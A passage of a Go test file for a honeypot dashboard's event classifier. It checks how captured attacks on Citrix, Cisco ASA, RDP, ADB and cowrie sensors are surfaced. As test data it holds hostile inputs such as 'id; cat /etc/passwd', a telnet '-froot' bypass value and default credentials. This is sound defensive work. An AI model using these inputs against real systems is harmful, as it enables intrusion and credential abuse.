	if ev.command != "id; cat /etc/passwd" {
		t.Fatalf("command (captured payload) = %q", ev.command)
	}
	if !strings.Contains(ev.detail, "id; cat /etc/passwd") {
		t.Fatalf("detail missing captured payload: %q", ev.detail)
	}
}

func TestClassifyCitrixHoneypotSurfacesUserAgentFingerprint(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "citrix-honeypot", "event": "get", "port": float64(443),
		"src_ip": "203.0.113.10", "path": "/vpn/", "user_agent": "curl/8.4.0",
		"headers": map[string]any{"User-Agent": "curl/8.4.0"},
	}, "citrix-honeypot")
	if ev.fingerprint != "curl/8.4.0" || ev.fingerKind != "User-Agent" {
		t.Fatalf("expected User-Agent fingerprint surfaced, got fingerprint=%q kind=%q", ev.fingerprint, ev.fingerKind)
	}
}

func TestClassifyCiscoASAHoneypotSurfacesIKEAndHTTPEvents(t *testing.T) {
	ike := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "ike_sa_init", "port": float64(500),
		"src_ip": "203.0.113.10", "proto": "ike",
	}, "cisco-asa-honeypot")
	if ike.skip || ike.proto != "ike" || !strings.Contains(ike.detail, "ike_sa_init") {
		t.Fatalf("unexpected ike event: %+v", ike)
	}

	listening := classify(map[string]any{"sensor": "cisco-asa-honeypot", "event": "ike_listening", "port": float64(500)}, "cisco-asa-honeypot")
	if !listening.skip {
		t.Fatal("ike_listening startup event should be skipped")
	}

	payload := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "cve_2018_0101_payload", "port": float64(8443),
		"src_ip": "203.0.113.10", "proto": "https", "data": "AAAA...overflow",
	}, "cisco-asa-honeypot")
	if payload.command != "AAAA...overflow" {
		t.Fatalf("command (captured payload) = %q", payload.command)
	}

	// #620: a plain POST that isn't the CVE-2018-0101 shape (e.g. a crafted
	// submission against the fake login page) must still surface its body,
	// just under "body:" instead of "payload:" so the two stay
	// distinguishable at a glance.
	genericPost := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "post", "port": float64(8443),
		"src_ip": "203.0.113.10", "proto": "https", "path": "/+CSCOE+/logon.html",
		"data": "username=admin&password=admin123",
	}, "cisco-asa-honeypot")
	if genericPost.command != "username=admin&password=admin123" {
		t.Fatalf("generic POST body not surfaced in ev.command: %q", genericPost.command)
	}
	if !strings.Contains(genericPost.detail, "body: username=admin&password=admin123") {
		t.Fatalf("generic POST body missing 'body:' framing in detail: %q", genericPost.detail)
	}
	if strings.Contains(genericPost.detail, "payload:") {
		t.Fatalf("generic POST must use 'body:' framing, not 'payload:' (CVE-specific): %q", genericPost.detail)
	}

	// An empty POST body must not add a stray "body:" label.
	emptyPost := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "post", "port": float64(8443),
		"src_ip": "203.0.113.10", "proto": "https", "path": "/+CSCOE+/logon.html",
	}, "cisco-asa-honeypot")
	if emptyPost.command != "" || strings.Contains(emptyPost.detail, "body:") {
		t.Fatalf("empty POST body should not surface a stray 'body:' label: %+v", emptyPost)
	}

	httpFingerprint := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "get", "port": float64(8443),
		"src_ip": "203.0.113.10", "proto": "https", "path": "/",
		"headers": map[string]any{"User-Agent": "nuclei"},
	}, "cisco-asa-honeypot")
	if httpFingerprint.fingerprint != "nuclei" || httpFingerprint.fingerKind != "User-Agent" {
		t.Fatalf("expected User-Agent fingerprint surfaced, got fingerprint=%q kind=%q",
			httpFingerprint.fingerprint, httpFingerprint.fingerKind)
	}

	unexpected := classify(map[string]any{
		"sensor": "cisco-asa-honeypot", "event": "ike_unexpected_exchange", "port": float64(500),
		"src_ip": "203.0.113.10", "proto": "ike", "data": "4",
	}, "cisco-asa-honeypot")
	if !strings.Contains(unexpected.detail, "type 4") {
		t.Fatalf("detail missing surfaced exchange type: %q", unexpected.detail)
	}
}

func TestClassifyRDPHoneypotSurfacesMstshashUsername(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "rdp-honeypot", "event": "connect", "port": float64(3389),
		"src_ip": "203.0.113.10", "username": "jdoe",
	}, "rdp-honeypot")
	if ev.skip || ev.sensor != "rdp-honeypot" || ev.proto != "rdp" {
		t.Fatalf("unexpected: %+v", ev)
	}
	if !ev.isLogin || ev.user != "jdoe" {
		t.Fatalf("expected isLogin with user=jdoe, got: %+v", ev)
	}
	if !strings.Contains(ev.detail, "jdoe") {
		t.Fatalf("detail missing username: %q", ev.detail)
	}
}

func TestClassifyRDPHoneypotSurfacesRequestedProtocols(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "rdp-honeypot", "event": "connect", "port": float64(3389),
		"src_ip": "203.0.113.10", "requested_protocols": "TLS+CredSSP",
	}, "rdp-honeypot")
	if !strings.Contains(ev.detail, "TLS+CredSSP") {
		t.Fatalf("detail missing requested protocols: %q", ev.detail)
	}
}

func TestClassifyRDPHoneypotSkipsListening(t *testing.T) {
	ev := classify(map[string]any{"sensor": "rdp-honeypot", "event": "listening", "port": float64(3389)}, "rdp-honeypot")
	if !ev.skip {
		t.Fatal("rdp-honeypot's startup 'listening' event should be skipped")
	}
}

// TestClassifyMultipotSurfacesDataForNonCommandEvents is a regression test:
// every multipot handler besides the literal "command" event kind rides its
// payload in "data" (SOCKS5 handshake/connect target, HL7 message,
// Elasticsearch/Docker HTTP body) or "command" under a different event kind
// (ADB's OPEN destination) or "client" (ADB's identity banner) -- none of
// these ever reached the dashboard row before, only kind=="command" did.
func TestClassifyMultipotSurfacesDataForNonCommandEvents(t *testing.T) {
	socks5 := classify(map[string]any{
		"sensor": "multipot", "event": "connect_request", "proto": "socks5", "port": float64(1080),
		"src_ip": "203.0.113.10", "data": "example.com:443",
	}, "multipot")
	if !strings.Contains(socks5.detail, "example.com:443") {
		t.Fatalf("SOCKS5 connect target not surfaced: %q", socks5.detail)
	}

	adbOpen := classify(map[string]any{
		"sensor": "multipot", "event": "open", "proto": "adb", "port": float64(5555),
		"src_ip": "203.0.113.10", "command": "shell:cat /proc/cpuinfo",
	}, "multipot")
	if !strings.Contains(adbOpen.detail, "shell:cat /proc/cpuinfo") || adbOpen.command != "shell:cat /proc/cpuinfo" {
		t.Fatalf("ADB OPEN destination not surfaced: %+v", adbOpen)
	}

	adbHandshake := classify(map[string]any{
		"sensor": "multipot", "event": "handshake", "proto": "adb", "port": float64(5555),
		"src_ip": "203.0.113.10", "client": "host::pixel_6",
	}, "multipot")
	if !strings.Contains(adbHandshake.detail, "host::pixel_6") || adbHandshake.fingerprint != "host::pixel_6" {
		t.Fatalf("ADB identity banner not surfaced: %+v", adbHandshake)
	}
}

// TestClassifyMultipotSurfacesSessionID is a regression test for #608:
// multipot's new per-connection "session" field must reach ev.session the
// same way cowrie's own "session" field already does, so filters.go/
// investigate.go/intelligence.go/search.go can group a multi-step
// interaction over one connection.
func TestClassifyMultipotSurfacesSessionID(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "multipot", "event": "login", "proto": "ftp", "port": float64(21),
		"src_ip": "203.0.113.10", "username": "root", "password": "toor",
		"session": "a1b2c3d4e5f6",
	}, "multipot")
	if ev.session != "a1b2c3d4e5f6" {
		t.Fatalf("ev.session = %q, want %q", ev.session, "a1b2c3d4e5f6")
	}
}

// TestClassifyMultipotHTTPRequestLineDoesNotPolluteTopCommands (#41): a live
// production check found HTTP GET/POST requests (multipot's Elasticsearch/
// Docker honeypots on 9200/2375) showing up in the Attacker Behavior tab's
// Top Commands list. handleElastic/handleDocker's "command" field for an
// "http_request" event is the raw request line, not an attacker-issued
// shell command -- it belongs in the detail line, never in ev.command
// (which feeds aggregate.go's commands[sensor+cmd]++ leaderboard).
func TestClassifyMultipotHTTPRequestLineDoesNotPolluteTopCommands(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "multipot", "event": "http_request", "proto": "elasticsearch", "port": float64(9200),
		"src_ip": "203.0.113.10", "command": "GET /_search HTTP/1.1",
	}, "multipot")
	if ev.command != "" {
		t.Fatalf("HTTP request line must not populate ev.command (pollutes Top Commands), got %q", ev.command)
	}
	if !strings.Contains(ev.detail, "GET /_search HTTP/1.1") {
		t.Fatalf("request line should still be visible in detail: %q", ev.detail)
	}
}

// TestClassifyCowrieSessionClosedUsesDurationMs is a regression test for a
// real bug found live: the code read e["duration"], but cowrie actually
// emits duration_ms (confirmed against docs/OUTPUT.rst and a live document
// pulled from the deployed cluster) -- so that branch's "closed after Ns"
// text never fired for any real event, silently falling back to the bare
// "closed" text instead.
func TestClassifyCowrieSessionClosedUsesDurationMs(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.session.closed", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "telnet", "duration_ms": float64(120003),
	}, "cowrie")
	if !strings.Contains(ev.detail, "120003ms") {
		t.Fatalf("detail = %q, want it to include the real duration_ms value", ev.detail)
	}
}

// TestClassifyCowrieDefaultFallsBackToMessage is a regression test: every
// cowrie event carries a human-readable "message" field per its own docs
// (confirmed live), but the default branch previously showed only the bare
// eventid suffix, discarding it -- losing real content for any of cowrie's
// 30+ eventids without their own explicit case.
func TestClassifyCowrieDefaultFallsBackToMessage(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.session.params", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "ssh",
		"message": "Session parameters: arch=amd64",
	}, "cowrie")
	if ev.detail != "Session parameters: arch=amd64" {
		t.Fatalf("detail = %q, want the real message text", ev.detail)
	}
}

func TestClassifyCowrieTTYLogSurfacesReplayableSession(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.log.closed", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "telnet",
		"ttylog": "var/lib/cowrie/tty/deadbeef", "shasum": "deadbeef", "duration_ms": float64(1928),
	}, "cowrie")
	if ev.download != "var/lib/cowrie/tty/deadbeef" {
		t.Fatalf("download (ttylog path) = %q", ev.download)
	}
	if !strings.Contains(ev.detail, "TTY session recorded") {
		t.Fatalf("detail = %q, want it to flag a replayable TTY recording", ev.detail)
	}
	if ev.ttyReplay != "/tty/deadbeef" {
		t.Fatalf("ttyReplay = %q, want /tty/deadbeef", ev.ttyReplay)
	}
	// #1266: the TTY log's own hash must NOT also become ev.shasum -- that
	// field feeds every "this event delivered a payload" signal downstream
	// (aggregate.go's payload leaderboard, the Shasum/VirusTotal action
	// links on every event row, and via canonical_shasum, attacker-
	// identity-worker's entity.Payloads), and a TTY session closing is not
	// a payload delivery.
	if ev.shasum != "" {
		t.Fatalf("shasum = %q, want empty -- a TTY log hash is not a payload hash", ev.shasum)
	}
}

func TestClassifyCowrieLoginFailedSurfacesPubkeyFingerprint(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.login.failed", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "ssh", "username": "root",
		"fingerprint": "SHA256:abcdef1234567890", "type": "ssh-rsa",
	}, "cowrie")
	if !ev.isLogin || ev.fingerprint != "SHA256:abcdef1234567890" || ev.fingerKind != "SSH pubkey" {
		t.Fatalf("unexpected: %+v", ev)
	}
}

func TestClassifyCowrieDirectTCPIPRequestSurfacesTarget(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.direct-tcpip.request", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "ssh",
		"dst_ip": "10.0.0.5", "dst_port": float64(3306),
	}, "cowrie")
	if !strings.Contains(ev.detail, "10.0.0.5:3306") {
		t.Fatalf("detail = %q, want the requested forward target", ev.detail)
	}
}

func TestClassifyCowrieTelnetExploitAttemptSurfacesCVE(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.telnet.exploit_attempt", "session": "abc123",
		"src_ip": "203.0.113.10", "protocol": "telnet",
		"cve": "CVE-2026-24061", "name": "USER", "value": "-froot",
	}, "cowrie")
	if !strings.Contains(ev.detail, "CVE-2026-24061") {
		t.Fatalf("detail = %q, want the CVE id surfaced", ev.detail)
	}
}
